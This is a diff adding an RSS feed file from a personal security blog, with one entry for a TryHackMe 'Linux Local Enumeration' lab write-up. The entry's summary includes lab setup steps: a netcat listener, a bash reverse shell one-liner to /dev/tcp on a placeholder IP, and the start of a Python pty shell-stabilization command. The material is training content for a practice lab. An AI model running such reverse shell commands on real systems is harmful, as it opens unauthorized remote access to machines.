@@ -1,0 +1,64 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" 
+  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
+  xmlns:dc="http://purl.org/dc/elements/1.1/" 
+  xmlns:atom="http://www.w3.org/2005/Atom" 
+  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
+  xmlns:media="http://search.yahoo.com/mrss/">
+  <channel>
+    <title>shell stabilization on Blog</title>
+    <link>https://martinkubecka.github.io/en/tags/shell-stabilization/</link>
+    <description>Recent content in shell stabilization on Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <copyright>&amp;copy;{year}, All Rights Reserved</copyright>
+    <lastBuildDate>Tue, 10 Nov 2020 00:00:00 +0000</lastBuildDate>
+    
+        <atom:link href="https://martinkubecka.github.io/en/tags/shell-stabilization/index.xml" rel="self" type="application/rss+xml" />
+    
+
+      
+      <item>
+        <title>Linux Local Enumeration [TryHackMe]</title>
+        <link>https://martinkubecka.github.io/en/posts/thm/linux-local-enumeration/</link>
+        <pubDate>Tue, 10 Nov 2020 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Tue, 10 Nov 2020 00:00:00 +0000</atom:modified>
+        <guid>https://martinkubecka.github.io/en/posts/thm/linux-local-enumeration/</guid>
+        <description>Title Linux Local Enumeration     Info Learn to efficiently enumerate a linux machine and identify possible weaknesses.   Difficulty N\A    Lab Setup  Upload PHP reverse shell on {MACHINE IP}:3000 Start netcat listener: nc -lnvp 1234  
+ Execute: bash -c &amp;lsquo;bash -i &amp;gt;&amp;amp; /dev/tcp/{LOCAL MACHINE IP}/1234 0&amp;gt;&amp;amp;1&amp;rsquo; Now we have a shell:  
+Stabilizing the shell TTY 1  python3 -c &amp;#39;import pty; pty.</description>
+        
+        <dc:creator>Martin Kubecka</dc:creator>
+        <media:content url="https://martinkubecka.github.io/images/thm/linux-local-enumeration/icon.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>enumaration</category>
+            
+          
+            
+              <category>shell stabilization</category>
+            
+          
+            
+              <category>enumeration scripts</category>
+            
+          
+        
+        
+          
+            
+              <category>Linux</category>
+            
+          
+        
+        
+      </item>
+      
+
+    
+  </channel>
+</rss>
